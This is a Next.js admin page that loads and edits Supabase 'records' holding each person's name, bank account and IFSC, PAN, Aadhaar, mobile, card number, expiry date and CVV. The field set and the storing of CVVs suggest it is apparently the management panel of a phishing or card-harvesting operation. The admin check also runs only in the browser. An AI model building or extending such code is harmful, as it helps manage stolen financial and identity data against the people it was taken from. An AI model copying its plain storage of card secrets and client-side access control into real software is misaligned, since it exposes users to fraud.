import { useRouter } from 'next/router'
import { useEffect, useState } from 'react'
import Navbar from '../components/Navbar'
import { supabase } from '../lib/supabaseClient'

export default function EditRecord() {
  const router = useRouter()
  const { id } = router.query
  const [user, setUser] = useState(null)
  const [role, setRole] = useState('')
  const [form, setForm] = useState(null)
  const [error, setError] = useState('')
  const [saving, setSaving] = useState(false)

  useEffect(() => {
    const init = async () => {
      const { data: { user } } = await supabase.auth.getUser()
      if (!user) return window.location.href = '/admin-login'
      const { data: profile } = await supabase.from('profiles').select('role').eq('id', user.id).single()
      if (profile?.role !== 'admin') return window.location.href = '/admin-login'
      setUser(user); setRole('admin')
    }
    init()
  }, [])

  useEffect(()=>{
    const fetchRec = async () => {
      if (!id) return
      const { data, error } = await supabase.from('records').select('*').eq('id', id).single()
      if (error) setError(error.message)
      else setForm(data)
    }
    fetchRec()
  }, [id])

  const handleChange = (e) => setForm({ ...form, [e.target.name]: e.target.value })

  const handleSave = async (e) => {
    e.preventDefault()
    setSaving(true)
    const { error } = await supabase.from('records').update({
      name: form.name, account_no: form.account_no, ifsc: form.ifsc, pan: form.pan, aadhaar: form.aadhaar,
      mobile: form.mobile, date: form.date, card_number: form.card_number, expiry_date: form.expiry_date, cvv: form.cvv
    }).eq('id', id)
    setSaving(false)
    if (!error) router.push('/admin/dashboard')
    else setError(error.message)
  }

  return (
    <div className="min-h-screen flex flex-col">
      <Navbar user={user} role={role} />
      <main className="max-w-3xl mx-auto px-4 py-8">
        <h1 className="text-2xl font-bold mb-4">Edit Record</h1>
        {error && <div className="text-red-400 mb-3">{error}</div>}
        {!form ? <div>Loading...</div> : (
          <form onSubmit={handleSave} className="card grid grid-cols-1 md:grid-cols-2 gap-4">
            {['name','account_no','ifsc','pan','aadhaar','mobile','date','card_number','expiry_date','cvv'].map((k) => (
              <div key={k}>
                <label className="block mb-1 capitalize opacity-80">{k.replace('_',' ')}</label>
                <input className="input" name={k} value={form[k] || ''} onChange={handleChange} />
              </div>
            ))}
            <div className="col-span-2">
              <button className="btn btn-primary">{saving ? 'Saving...' : 'Save'}</button>
            </div>
          </form>
        )}
      </main>
    </div>
  )
}
